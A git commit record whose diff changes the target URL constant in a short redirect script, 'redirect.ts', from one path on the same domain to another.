c0a5435f6206b112d46bc0a2437775b81985c2df
owostic222 <rashadhaakim@gmail.com>
2025-08-26 12:24:19 -0500

    Update redirect.ts

--- redirect.ts
+++ redirect.ts
@@ -1,7 +1,7 @@
 // redirect.ts
 
 // Define the redirect URL
-const redirectUrl = "https://12358rr.com/UNEhwFqW"; // Replace with the URL you want to redirect to
+const redirectUrl = "https://12358rr.com/ztPUTDWo"; // Replace with the URL you want to redirect to
 
 // Handle the request
 addEventListener("fetch", (event) => {
